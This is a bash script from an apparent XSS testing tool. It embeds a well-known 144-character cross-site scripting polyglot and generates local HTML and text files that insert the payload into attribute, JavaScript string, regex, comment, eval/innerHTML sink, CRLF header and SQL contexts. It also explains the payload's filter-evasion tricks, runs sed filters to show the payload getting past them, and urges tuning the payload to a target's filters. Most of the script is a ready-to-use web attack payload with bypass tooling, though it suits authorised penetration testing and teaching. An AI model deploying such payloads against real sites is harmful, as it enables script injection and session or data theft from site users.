#!/bin/bash

# XSS Vibes - HackVault Ultimate Polyglot Tester
# Tests the ultimate 144-character polyglot across multiple contexts

echo "🔥 XSS Vibes - HackVault Ultimate Polyglot Tester"
echo "================================================"
echo "🎯 Testing the legendary 144-character polyglot by 0xSobky"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# The ultimate polyglot
ULTIMATE_POLYGLOT="jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
HTML_ESCAPED="jaVasCript:/*-/*\`/*\\\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"

echo -e "${CYAN}🏆 THE ULTIMATE POLYGLOT (144 chars):${NC}"
echo -e "${YELLOW}$ULTIMATE_POLYGLOT${NC}"
echo ""
echo -e "${PURPLE}📊 Polyglot Statistics:${NC}"
echo "   📏 Length: 144 characters"
echo "   👨‍💻 Creator: 0xSobky (HackVault)"
echo "   🎯 Contexts: HTML, JavaScript, CSS, Regex, Comments, and more"
echo "   🛡️ Evasion: Case variation, comment breaking, encoding"
echo ""

# Test contexts
echo -e "${GREEN}🧪 TESTING ACROSS MULTIPLE CONTEXTS${NC}"
echo "====================================="

TEST_DIR="polyglot_test_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

# HTML Context Tests
echo -e "${BLUE}1. HTML Attribute Contexts:${NC}"
echo "   🔸 Double-quoted attributes"
echo "   🔸 Single-quoted attributes" 
echo "   🔸 Unquoted attributes"
echo "   🔸 HTML-escaped attributes"
echo ""

cat > "html_contexts.html" << EOF
<!DOCTYPE html>
<html>
<head><title>Polyglot HTML Context Test</title></head>
<body>
    <h1>HackVault Ultimate Polyglot - HTML Contexts</h1>
    
    <!-- Double-quoted attribute -->
    <input type="text" value="$ULTIMATE_POLYGLOT">
    
    <!-- Single-quoted attribute -->
    <input type='text' value='$ULTIMATE_POLYGLOT'>
    
    <!-- Unquoted attribute -->
    <input type=text value=$ULTIMATE_POLYGLOT>
    
    <!-- HTML-escaped attribute -->
    <img border=3 alt=$HTML_ESCAPED>
    
    <!-- href attribute -->
    <a href="$HTML_ESCAPED">click me</a>
    
    <!-- HTML comments -->
    <!-- $ULTIMATE_POLYGLOT -->
    
    <!-- Common HTML tags -->
    <title>$ULTIMATE_POLYGLOT</title>
    <style>$ULTIMATE_POLYGLOT</style>
    <textarea>$ULTIMATE_POLYGLOT</textarea>
    <div>$ULTIMATE_POLYGLOT</div>
</body>
</html>
EOF

echo -e "${BLUE}2. JavaScript Contexts:${NC}"
echo "   🔸 Double-quoted strings"
echo "   🔸 Single-quoted strings"
echo "   🔸 Template literals"
echo "   🔸 Regular expressions"
echo "   🔸 Comments"
echo ""

cat > "js_contexts.html" << EOF
<!DOCTYPE html>
<html>
<head><title>Polyglot JS Context Test</title></head>
<body>
    <h1>HackVault Ultimate Polyglot - JavaScript Contexts</h1>
    <script>
        // Double-quoted string
        var str1 = "$ULTIMATE_POLYGLOT";
        
        // Single-quoted string  
        var str2 = '$ULTIMATE_POLYGLOT';
        
        // Template literal
        var str3 = \`$ULTIMATE_POLYGLOT\`;
        
        // Regular expression
        var re = /$ULTIMATE_POLYGLOT/;
        
        // Single-line comment
        //$ULTIMATE_POLYGLOT
        
        /* Multi-line comment
        $ULTIMATE_POLYGLOT
        */
    </script>
</body>
</html>
EOF

echo -e "${BLUE}3. JavaScript Sinks:${NC}"
echo "   🔸 eval()"
echo "   🔸 setTimeout()"
echo "   🔸 setInterval()"
echo "   🔸 Function()"
echo "   🔸 innerHTML/outerHTML"
echo ""

cat > "js_sinks.html" << EOF
<!DOCTYPE html>
<html>
<head><title>Polyglot JS Sinks Test</title></head>
<body>
    <h1>HackVault Ultimate Polyglot - JavaScript Sinks</h1>
    <script>
        // Test with location.hash (manual test)
        // eval(location.hash.slice(1));
        
        // Test with setTimeout (manual test)
        // setTimeout(location.search.slice(1));
        
        // Test with innerHTML (manual test)
        // var data = "$HTML_ESCAPED";
        // document.body.innerHTML = data;
        
        console.log("Polyglot sink tests ready - check manual execution");
    </script>
</body>
</html>
EOF

echo -e "${BLUE}4. Bonus Contexts:${NC}"
echo "   🔸 CRLF injection"
echo "   🔸 SQL injection contexts"
echo "   🔸 Event handlers"
echo ""

cat > "bonus_contexts.txt" << EOF
CRLF Injection Context:
HTTP/1.1 200 OK
Date: $(date)
Content-Type: text/html; charset=utf-8
Set-Cookie: x=$ULTIMATE_POLYGLOT

SQL Injection Context:
SELECT * FROM Users WHERE Username='$ULTIMATE_POLYGLOT'
SELECT * FROM Users WHERE Username="$ULTIMATE_POLYGLOT"

Event Handler Context:
<svg onload="void '$HTML_ESCAPED';"></svg>
EOF

# Filter Evasion Tests
echo -e "${YELLOW}🛡️ FILTER EVASION ANALYSIS${NC}"
echo "=========================="
echo ""

echo -e "${PURPLE}Filter Bypass Techniques in the Polyglot:${NC}"
echo "1. 🔸 Case variation: jaVasCript:, oNcliCk=, oNloAd="
echo "2. 🔸 Comment breaking: /*-/*\`/*\\\`/*'/*\"/**/"
echo "3. 🔸 Tag breakers: </stYle/</titLe/</teXtarEa/</scRipt/--!>"
echo "4. 🔸 Encoding: \\x3c for < and \\x3e for >"
echo "5. 🔸 CRLF sequences: %0D%0A%0d%0a"
echo "6. 🔸 Comment terminators: --!>"
echo ""

# Test against common filters
echo -e "${GREEN}🧪 Testing Against Common Filters:${NC}"
echo ""

# Simulate basic filters
TEST_PAYLOAD="$ULTIMATE_POLYGLOT"

echo "Original payload length: ${#TEST_PAYLOAD} characters"
echo ""

# Test 1: Remove javascript: pattern
FILTER1=$(echo "$TEST_PAYLOAD" | sed 's/\bjavascript://g')
echo "Filter 1 (remove javascript:): Length after: ${#FILTER1} chars"
if [ ${#FILTER1} -lt ${#TEST_PAYLOAD} ]; then
    echo "   ❌ Filter detected and removed content"
else
    echo "   ✅ Bypass successful - case variation worked"
fi

# Test 2: Remove on* event handlers
FILTER2=$(echo "$TEST_PAYLOAD" | sed 's/\bon\w*=//g')
echo "Filter 2 (remove on*= events): Length after: ${#FILTER2} chars"
if [ ${#FILTER2} -lt ${#TEST_PAYLOAD} ]; then
    echo "   ❌ Filter detected and removed content"
else
    echo "   ✅ Bypass successful - case variation worked"
fi

# Test 3: Remove closing tags
FILTER3=$(echo "$TEST_PAYLOAD" | sed 's/<\/\w*>//g')
echo "Filter 3 (remove </tag>): Length after: ${#FILTER3} chars"
if [ ${#FILTER3} -lt ${#TEST_PAYLOAD} ]; then
    echo "   ❌ Filter detected and removed content"
else
    echo "   ✅ Bypass successful - malformed tags worked"
fi

echo ""
echo -e "${CYAN}📁 Test Files Generated:${NC}"
echo "   📄 html_contexts.html - HTML attribute and tag contexts"
echo "   📄 js_contexts.html - JavaScript string and comment contexts"
echo "   📄 js_sinks.html - JavaScript execution sink contexts"
echo "   📄 bonus_contexts.txt - CRLF, SQL, and event handler contexts"
echo ""

echo -e "${YELLOW}💡 Manual Testing Instructions:${NC}"
echo "================================"
echo "1. 🌐 Open HTML files in browser and inspect for XSS execution"
echo "2. 🔍 Check browser console for JavaScript errors/execution"
echo "3. 🕵️ Test with different browsers (Chrome, Firefox, Safari, Edge)"
echo "4. 🔧 Modify payloads and test against your target's specific filters"
echo "5. 📊 Use URL fragment for eval() test: file.html#PAYLOAD"
echo "6. 🔗 Use URL parameters for setTimeout() test: file.html?PAYLOAD"
echo ""

echo -e "${GREEN}🏆 HackVault Ultimate Polyglot Analysis Complete!${NC}"
echo -e "${RED}⚠️  Remember: Only test on authorized targets!${NC}"
echo ""
echo -e "${BLUE}📚 References:${NC}"
echo "   • Original research: 0xSobky's HackVault"
echo "   • Polyglot contexts: 20+ different injection scenarios"
echo "   • Filter evasion: 6+ bypass techniques demonstrated"
echo ""
echo -e "${PURPLE}Test directory: $(pwd)${NC}"
